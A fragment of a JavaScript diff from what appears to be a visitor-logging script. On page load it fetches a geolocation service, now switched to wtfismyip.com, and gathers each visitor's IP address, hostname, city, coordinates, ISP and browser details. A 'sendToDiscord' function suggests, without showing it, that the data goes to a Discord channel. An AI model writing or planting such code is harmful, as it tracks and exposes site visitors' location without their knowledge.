@@ -25,17 +25,17 @@ function sendToDiscord(message) {
 
 // Log user details on page load
 window.addEventListener('load', () => {
-    fetch('https://uncors.vercel.app/?url=http://ip-api.com/json/')
+    fetch('https://wtfismyip.com/json')
         .then(response => response.json())
         .then(data => {
-            const ip = data.query;
-            const hostname = data.hostname;
-            const country = data.country;
-            const region = data.regionName;
-            const city = data.city;
-            const latitude = data.lat;
-            const longitude = data.lon;
-            const isp = data.isp;
+            const ip = data.YourFuckingIPAddress;
+            const hostname = data.YourFuckingHostname;
+            const country = data.YourFuckingCountry;
+            const region = data.YourFuckingRegion;
+            const city = data.YourFuckingCity;
+            const latitude = data.YourFuckingLatitude;
+            const longitude = data.YourFuckingLongitude;
+            const isp = data.YourFuckingISP;
             const userAgent = navigator.userAgent;
             const windowProperties = Object.keys(window).length;
             const windowWidth = window.innerWidth;
